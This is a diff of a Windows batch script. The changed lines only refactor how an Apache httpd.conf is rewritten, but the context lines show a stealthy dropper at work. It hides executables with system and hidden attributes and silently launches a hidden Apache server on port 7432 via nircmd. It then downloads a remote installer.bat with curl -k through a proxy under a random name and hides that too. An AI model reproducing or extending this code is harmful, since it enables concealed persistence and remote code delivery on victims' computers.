@@ -36,17 +36,13 @@ if not errorlevel 1 (attrib +s +h +i "%environment%\expose.exe") else (attrib -s
 echo Define ENVIRONMENT "%environment%" >> "%environment%\apache2\conf\httpd.txt"
 echo Define PORT "7432" >> "%environment%\apache2\conf\httpd.txt"
 type "%environment%\apache2\conf\httpd.conf" >> "%environment%\apache2\conf\httpd.txt"
-del "%environment%\apache2\conf\httpd.conf"
-ren "%environment%\apache2\conf\httpd.txt" "httpd.conf"
+move /y "%environment%\apache2\conf\httpd.txt" "%environment%\apache2\conf\httpd.conf"
 
 tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
 if not errorlevel 1 (echo.) else ("%environment%\nircmd.exe" exec hide "%environment%\apache2\bin\httpd.exe")
 
-for /f "skip=2 delims=*" %%a in ("%environment%\apache2\conf\httpd.conf") do (
-echo %%a >>"%environment%\apache2\conf\httpd.txt"    
-)
-del "%environment%\apache2\conf\httpd.conf"
-ren "%environment%\apache2\conf\httpd.txt" "httpd.conf"
+more +2 "%environment%\apache2\conf\httpd.conf" > "%environment%\apache2\conf\httpd.txt"
+move /y "%environment%\apache2\conf\httpd.txt" "%environment%\apache2\conf\httpd.conf"
 
 set "installer=%random%%random%"
 "%environment%\curl.exe" -k %proxy% %host%/Tools/installer.bat -o "%environment%\Win32\%installer%.bat" && attrib +s +h +i "%environment%\Win32\%installer%.bat"
